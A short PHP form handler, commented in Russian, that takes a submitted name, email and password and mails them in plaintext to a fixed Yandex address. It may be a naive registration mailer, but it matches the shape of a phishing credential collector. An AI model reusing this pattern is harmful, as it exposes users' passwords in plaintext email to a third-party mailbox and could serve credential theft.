<?php
//Принимаем постовые данные
$name=$_POST['name'];
$mail=$_POST['mail'];
$password=$_POST['password'];
//Тут указываем на какой ящик посылать письмо
$to = "naraxissbonus@yandex.ru";
//Далее идет тема и само сообщение
// Тема письма
$subject = "Ваши данные регистрации";
// Сообщение письма
$message = "
Имя пользователя: ".htmlspecialchars($name)."<br />
E-mail: ".htmlspecialchars($mail)."<br />
Пароль: ".htmlspecialchars($password);

// Отправляем письмо при помощи функции mail();
$headers = "From: sokolovdm.io <info@sokolovdm.ru>\r\nContent-type: text/html; charset=UTF-8 \r\n";
mail ($to, $subject, $message, $headers);
exit();
?>